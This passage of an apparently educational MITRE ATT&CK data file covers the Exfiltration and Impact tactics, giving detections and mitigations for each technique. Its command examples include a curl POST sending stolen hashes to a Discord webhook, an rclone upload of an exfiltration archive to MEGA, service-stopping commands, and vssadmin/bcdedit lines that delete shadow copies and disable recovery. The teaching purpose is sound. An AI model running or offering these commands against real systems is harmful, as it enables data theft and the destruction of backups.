        mitigation: "Block certutil.exe and PowerShell from downloading files via AppLocker; restrict outbound internet access for servers."
      },
      {
        id: "T1573",
        name: "Encrypted Channel",
        subTechnique: "T1573.002 (Asymmetric Cryptography)",
        summary: "Encrypting C2 communications using asymmetric encryption (RSA + AES) so defenders cannot inspect command payloads on the wire.",
        adversaryUsage: "All Cobalt Strike beacon tasking and output is encrypted with an attacker-controlled RSA public key.",
        commandExample: "C2 Traffic: AES-256-CBC with TLS 1.3 wrapping",
        detection: "Certificate inspection: self-signed certs, mismatched SNI, unusual TLS cipher suites.",
        mitigation: "Deploy TLS decryption (SSL inspection) at the enterprise egress firewall with strict certificate validation."
      }
    ],
    redVsBlue: {
      redAction: "Beacon beacons out over DNS tunneling queries (high-entropy subdomains).",
      blueCounter: "Next-Gen Firewall DNS Security flags abnormal query length and blocks destination domain."
    }
  },
  {
    id: "TA0010",
    order: 13,
    name: "Exfiltration",
    shortName: "Exfiltration",
    icon: "upload-cloud",
    color: "#0ea5e9", // Sky
    glowColor: "rgba(14, 165, 233, 0.4)",
    adversaryGoal: "Steal data by transferring it out of the target network.",
    analogy: "Loading the loot bags into the getaway van and speeding away from the bank undetected.",
    description: "Techniques used by adversaries to steal data from your network. Adversaries compress and encrypt data, then transfer it over C2 channels, cloud storage (MEGA, AWS S3), or alternate protocols.",
    techniques: [
      {
        id: "T1048",
        name: "Exfiltration Over Alternative Protocol",
        subTechnique: "T1048.003 (Exfiltration Over Unencrypted/Encrypted Non-C2 Protocol)",
        summary: "Transferring stolen data out over cloud sync utilities (Rclone to MEGA, Dropbox, Google Drive, or Azure Blob).",
        adversaryUsage: "Adversary runs Rclone to sync 50GB of archived corporate files directly to an attacker-controlled MEGA storage account.",
        commandExample: "rclone.exe copy C:\\Temp\\exfil.zip remote:mega_bucket --max-transfer 10M",
        detection: "Spike in outbound traffic volume to cloud storage providers; execution of known cloud sync tools (rclone, megasync).",
        mitigation: "CASB (Cloud Access Security Broker) blocking unapproved personal cloud storage destinations; egress bandwidth quotas."
      },
      {
        id: "T1041",
        name: "Exfiltration Over C2 Channel",
        subTechnique: "N/A",
        summary: "Stealing data by piping chunks of it directly back over the already established Command and Control communications channel.",
        adversaryUsage: "Chunking exfiltration archive into 512KB blocks and sending each block within regular HTTPS POST beacon responses.",
        commandExample: "Beacon command: upload_chunk /data C:\\Temp\\exfil.zip.001",
        detection: "Ratio anomaly between outbound POST payload size vs incoming response size on web proxy.",
        mitigation: "Deep packet inspection for abnormal HTTP POST payload volumes; strict egress rate-limiting."
      },
      {
        id: "T1567",
        name: "Exfiltration Over Web Service",
        subTechnique: "T1567.002 (Exfiltration to Cloud Storage)",
        summary: "Using legitimate public web APIs (like Discord webhooks, Telegram bots, or GitHub Gists) to smuggle data out.",
        adversaryUsage: "Sending stolen credentials directly to an attacker-controlled Discord webhook via curl.",
        commandExample: "curl -H \"Content-Type: application/json\" -X POST -d '{\"content\":\"Stolen Hash: ...\"}' https://discord.com/api/webhooks/...",
        detection: "Outbound HTTPS requests from servers to consumer chat and collaboration platforms (Discord, Telegram).",
        mitigation: "Block consumer communication API endpoints from all corporate workstations and server subnets."
      }
    ],
    redVsBlue: {
      redAction: "Use rclone to upload stolen CAD designs to an anonymous MEGA bucket.",
      blueCounter: "Egress firewall CASB policy intercepts and blocks unsanctioned cloud storage upload; alerts CISO."
    }
  },
  {
    id: "TA0040",
    order: 14,
    name: "Impact",
    shortName: "Impact",
    icon: "flame",
    color: "#f43f5e", // Rose / Crimson
    glowColor: "rgba(244, 63, 94, 0.4)",
    adversaryGoal: "Disrupt availability, compromise integrity, or destroy systems and data.",
    analogy: "Setting fire to the building or blowing up the bridge on the way out to ensure complete destruction or extort ransom.",
    description: "Techniques used by adversaries to disrupt availability or compromise integrity by destroying, manipulating, or encrypting systems and data. This represents the catastrophic endgame of ransomware and wiper attacks.",
    techniques: [
      {
        id: "T1486",
        name: "Data Encrypted for Impact",
        subTechnique: "N/A",
        summary: "Encrypting files across all accessible systems and network drives with high-speed asymmetric encryption (AES+RSA) to demand ransom.",
        adversaryUsage: "Ransomware (LockBit, BlackCat) deploys across Domain Controllers via GPO, encrypting files and dropping 'HOW_TO_RECOVER.txt'.",
        commandExample: "ransomware.exe -path \\\\fileserver01\\shares -threads 16 -skip-os",
        detection: "Rapid file rename/write bursts with high Shannon entropy, sudden deletion of Windows Volume Shadow Copies (vssadmin delete shadows).",
        mitigation: "Immutable offline backups, EDR anti-ransomware canary files and automated process kill heuristics."
      },
      {
        id: "T1489",
        name: "Service Stop",
        subTechnique: "N/A",
        summary: "Stopping critical business databases, backup services, and security solutions so files can be encrypted without file-lock errors.",
        adversaryUsage: "Stopping SQL Server, Exchange, and Veeam backup services before initiating the ransomware encryption loop.",
        commandExample: "net stop MSSQLSERVER && net stop VeeamBackupSvc && net stop MSExchangeIS",
        detection: "Windows Event ID 7036 (Mass service stop events in rapid succession within 30 seconds).",
        mitigation: "Harden service permissions; configure services to automatically restart; enforce MFA for service state modifications."
      },
      {
        id: "T1490",
        name: "Inhibit System Recovery",
        subTechnique: "N/A",
        summary: "Deleting volume shadow copies, disabling Windows startup recovery modes, and clearing backup catalogs to prevent victim restoration.",
        adversaryUsage: "Running vssadmin to delete all Volume Shadow Copies so the victim cannot roll back encrypted drives.",
        commandExample: "vssadmin.exe delete shadows /all /quiet && bcdedit.exe /set {default} recoveryenabled No",
        detection: "Execution of vssadmin.exe delete shadows or wbadmin.exe delete catalog; Sysmon Event ID 1 alert.",
        mitigation: "Prevent non-system processes from running vssadmin; store backups in write-once-read-many (WORM) storage."
      }
    ],
    redVsBlue: {
      redAction: "Ransomware script calls vssadmin delete shadows and begins encrypting all network shares.",
      blueCounter: "Anti-Ransomware behavioral guard detects Volume Shadow Copy wipe attempt; instantly suspends process and rolls back files."
    }
  }
];

// High-level MITRE Statistics & Reference Data
export const MITRE_STATS = {
  totalTactics: 14,
  primaryTechniques: 42,
  enterpriseVersion: "v14.1",
  matrixScope: "Enterprise ATT&CK (Windows, Linux, macOS, Cloud, Identity)",
  killChainAlignment: [
    { phase: "Pre-Attack / Preparation", tactics: ["TA0043", "TA0042"] },
    { phase: "Initial Compromise", tactics: ["TA0001", "TA0002", "TA0003"] },
    { phase: "Privilege & Internal Foothold", tactics: ["TA0004", "TA0005", "TA0006"] },
    { phase: "Internal Recon & Pivot", tactics: ["TA0007", "TA0008", "TA0009"] },
    { phase: "Execution of Objectives", tactics: ["TA0011", "TA0010", "TA0040"] }
  ]
};
